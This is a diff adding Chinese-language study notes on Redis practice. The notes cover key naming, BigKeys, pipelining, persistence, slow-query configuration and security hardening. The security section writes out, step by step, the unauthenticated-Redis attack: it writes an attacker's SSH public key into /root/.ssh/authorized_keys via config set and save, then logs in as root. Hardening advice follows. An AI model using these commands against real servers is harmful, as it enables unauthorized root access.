@@ -6516,3 +6516,304 @@ public class ItemServiceImpl extends ServiceImpl<ItemMapper, Item> implements II
 
 # Redis键值设计
 
+
+
+* 遵循基本格式：[业务名称]:[数据名]:[id]
+
+* 长度不超过44字节
+* 不包含特殊字符
+
+这样做的好处：
+
+* 可读性强
+* 避免key冲突
+* 方便管理
+* 更节省内存： key是string类型，底层编码包含int、embstr和raw三种。embstr在小于44字节使用，采用连续内 存空间，内存占用更小
+
+
+
+## BigKey
+
+### 判定bigKey
+
+BigKey通常以Key的大小和Key中成员的数量来综合判定
+
+* Key本身的数据量过大：比如一个String类型的Key，它的值为5 MB或者更大
+* Key中的成员数过多：比如一个ZSET类型的Key，它的成员数量为10,000个或者更多
+* Key中成员的数据量过大：比如一个Hash类型的Key，它的成员数量虽然只有1,000个但这些成员的Value（值）总大小为100 MB
+
+
+
+
+
+### bigKey的危害
+
+* 网络阻塞：对BigKey执行读请求时，少量的QPS就可能导致带宽使用率被占满，导致Redis实例，乃至所在物理机变慢
+* 数据倾斜：BigKey所在的Redis实例内存使用率远超其他实例，无法使数据分片的内存资源达到均衡
+* Redis阻塞：对元素较多的hash、list、zset等做运算会耗时较长，使主线程被阻塞
+* CPU压力：对BigKey的数据序列化和反序列化会导致CPU的使用率飙升，影响Redis实例和本机其它应用
+
+
+
+
+
+### 如何发现
+
+* redis-cli --bigkeys
+
+利用redis-cli提供的--bigkeys参数，可以遍历分析所有key，并返回Key的整体统计信息与每个数据的Top1的big key
+
+* scan扫描
+* 第三方工具
+* 网络监控
+
+
+
+
+
+## 恰当的数据类型
+
+比如存储一个User对象，我们有三种存储方式
+
+* json字符串
+* 字段打散
+* hash
+
+
+
+json字符串：
+
+* 优点：实现简单粗暴 
+* 缺点：数据耦合，不够灵活
+
+字段打散：
+
+* 优点：可以灵活访问对象任意字段 
+* 缺点：占用空间大、没办法做统一控制
+
+hash：
+
+* 优点：底层使用ziplist，空间占用小，可以灵活访问对象的任意字段 
+* 缺点：代码相对复杂
+
+
+
+假如有hash类型的key，其中有100万对field和value，field是自增id，这个key存在什么问题？如何优化
+
+存在的问题：
+
+* hash的entry数量超过500时，会使用哈希表而不是 ZipList，内存占用较多。
+* 可以通过hash-max-ziplist-entries配置entry 上限。但是如果entry过多就会导致BigKey问题
+
+
+
+解决方案：拆分为小的hash，将 id / 100 作为key， 将id % 100 作为field，这样每100个元素为一个Hash
+
+
+
+
+
+# 批处理优化
+
+
+
+单个命令的执行：
+
+一次命令的响应时间 = 1次往返的网络传输耗时 + 1次Redis执行命令耗时
+
+N条命令依次执行：
+
+N次命令的响应时间 = N次往返的网络传输耗时 + N次Redis执行命令耗时
+
+N条命令批量执行：
+
+N次命令的响应时间 = 1次往返的网络传输耗时 + N次Redis执行命令耗时
+
+
+
+网络传输耗时在1-10毫秒左右，Redis执行命令耗时一般小于0.1毫秒
+
+
+
+Pipeline：
+
+```java
+@Test
+void testPipeline() {
+	// 创建管道
+	Pipeline pipeline = jedis.pipelined();
+	for (int i = 1; i <= 100000; i++) {
+		// 放入命令到管道
+		pipeline.set("test:key_" + i, "value_" + i);
+		if (i % 1000 == 0) {
+		// 每放入1000条命令，批量执行
+			pipeline.sync();
+		}
+	}
+}
+
+```
+
+
+
+
+
+集群下的批处理：
+
+如MSET或Pipeline这样的批处理需要在一次请求中携带多条命令，而此时如果Redis是一个集群，那批处理命令的多 个key必须落在一个插槽中，否则就会导致执行失败
+
+
+
+|      | 串行命令 | 串行slot | 并行slot | hash_tag |
+| ---- | -------- | -------- | -------- | -------- |
+|实现思路|for循环遍历，依次执行每个命令|在客户端计算每个key的 slot，将slot一致分为一 组，每组都利用Pipeline 批处理。 串行执行各组命令|在客户端计算每个key的 slot，将slot一致分为一 组，每组都利用Pipeline 批处理。 并行执行各组命令|将所有key设置相同的 hash_tag，则所有 key的slot一定相同|
+|耗时|N次网络耗时 + N次 命令耗时|m次网络耗时 + N次命令 耗时 m = key的slot个数|1次网络耗时 + N次命令 耗时|1次网络耗时 + N次命令耗时|
+|优点|实现简单|耗时较短|耗时非常短|耗时非常短、实现简单|
+|缺点|耗时非常久|实现稍复杂 slot越多，耗时越久|实现复杂|容易出现数据倾斜|
+
+
+
+
+
+
+
+# 服务端优化
+
+## 持久化配置
+
+Redis的持久化虽然可以保证数据安全，但也会带来很多额外的开销，因此持久化请遵循下列建议:
+
+* 用来做缓存的Redis实例尽量不要开启持久化功能
+* 建议关闭RDB持久化功能，使用AOF持久化
+* 利用脚本定期在slave节点做RDB，实现数据备份
+* 设置合理的rewrite阈值，避免频繁的bgrewrite
+* 配置no-appendfsync-on-rewrite = yes，禁止在rewrite期间做aof，避免因AOF引起的阻塞
+* Redis实例的物理机要预留足够内存，应对fork和rewrite
+* 单个Redis实例内存上限不要太大，例如4G或8G。可以加快fork的速度、减少主从同步、数据迁移压力
+* 不要与CPU密集型应用部署在一起。比如：elasticsearch
+* 不要与高硬盘负载应用一起部署。例如：数据库、消息队列
+
+
+
+## 慢查询
+
+在Redis执行时耗时超过某个阈值的命令，称为慢查询
+
+慢查询的阈值可以通过配置指定：
+
+* slowlog-log-slower-than：慢查询阈值，单位是微秒。默认是10000，建议1000 慢查询会被放入慢查询日志中，日志的长度有上限，可以通过配置指定
+
+* slowlog-max-len：慢查询日志（本质是一个队列）的长度。默认是128，建议1000
+
+
+
+```sh
+127.0.0.1:6379> config get slowlog-log-slower-than
+1) "slowlog-log-slower-than"
+2) "10000"
+127.0.0.1:6379> config get slowlog-max-len
+1) "slowlog-max-len"
+2) "128"
+127.0.0.1:6379>
+```
+
+```sh
+127.0.0.1:6379> config set slowlog-max-len 1000
+OK
+127.0.0.1:6379> config get  slowlog-max-len
+1) "slowlog-max-len"
+2) "1000"
+127.0.0.1:6379>
+```
+
+
+
+查看慢查询日志列表：
+
+* slowlog len：查询慢查询日志长度
+* slowlog get [n]：读取n条慢查询日志
+* slowlog reset：清空慢查询列表
+
+
+
+
+
+## 命令及安全配置
+
+Redis会绑定在0.0.0.0:6379，这样将会将Redis服务暴露到公网上，而Redis如果没有做身份认证，会出现严重的安全漏洞
+
+### 安全漏洞
+
+Redis安全模型的观念是:“请不要将Redis暴露在公开网络中,因为让不受信任的客户接触到Redis是非常危险的”。
+
+Redis作者之所以放弃解决未授权访问导致的不安全性是因为,99.99%使用Redis的场景都是在沙盒化的环境中,为了0.01%的可能性增加安全规则的同时也增加了复杂性,虽然这个问题的并不是不能解决的,但是这在他的设计哲学中仍是不划算的。
+
+因为其他受信任用户需要使用Redis或者因为运维人员的疏忽等原因，部分Redis绑定在0.0.0.0:6379，并且没有开启认证（这是Redis的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，将会导致Redis服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。
+
+利用Redis自身的相关方法，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的/root/.ssh文件夹的authotrized_keys文件中，进而可以直接登录目标服务器。
+
+
+
+首先在本地生产公私钥文件：
+
+```sh
+ssh-keygen –t rsa
+```
+
+然后将公钥写入foo.txt文件：
+
+```sh
+(echo -e "  "; cat id_rsa.pub; echo -e "  ") > foo.txt
+```
+
+再连接Redis写入文件：
+
+```sh
+cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+redis-cli -h 192.168.1.11
+192.168.1.11:6379> config set dir /root/.ssh/
+OK
+192.168.1.11:6379> config get dir
+1) "dir"
+2) "/root/.ssh"
+192.168.1.11:6379> config set dbfilename "authorized_keys"
+OK
+192.168.1.11:6379> save
+OK
+```
+
+这样就可以成功的将自己的公钥写入/root/.ssh文件夹的authotrized_keys文件里，然后攻击者直接执行：
+
+```sh
+ssh –i  id_rsa root@ip地址
+```
+
+即可远程利用自己的私钥登录该服务器。
+
+
+
+
+
+出现原因：
+
+* Redis未设置密码
+* 利用了Redis的config set命令动态修改Redis配置
+* 使用了Root账号权限启动Redis
+
+
+
+### 安全漏洞建议
+
+* Redis一定要设置密码
+* 禁止线上使用下面命令：keys、flushall、flushdb、config set等命令。可以利用rename-command禁用
+* bind：限制网卡，禁止外网网卡访问
+* 开启防火墙
+* 不要使用Root账户启动Redis
+* 尽量不是有默认的端口
+
+
+
+
+
+## 内存配置
+
